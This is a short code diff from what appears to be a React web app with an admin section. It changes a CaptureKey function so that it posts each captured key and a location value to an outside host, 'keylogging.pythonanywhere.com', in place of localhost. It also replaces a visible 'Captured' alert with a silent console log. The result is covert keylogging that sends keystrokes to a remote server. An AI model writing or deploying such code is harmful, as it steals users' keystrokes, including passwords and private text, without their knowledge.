@@ -9,7 +9,7 @@ import { LocationContext } from './contexts/LocationContext';
 import Admin from './admin/Admin';
 
 const CaptureKey = (key, location) => {
-  fetch('http://localhost:5000/api/new_keylog', {
+  fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
     method: 'POST',
     body: JSON.stringify({ key, location }),
 
@@ -21,7 +21,7 @@ const CaptureKey = (key, location) => {
     }
     return responce.json();
   }).then(data => {
-    alert('Captured')
+    console.log('Captured')
 
   }).catch(error => {
     console.log('Aborted')
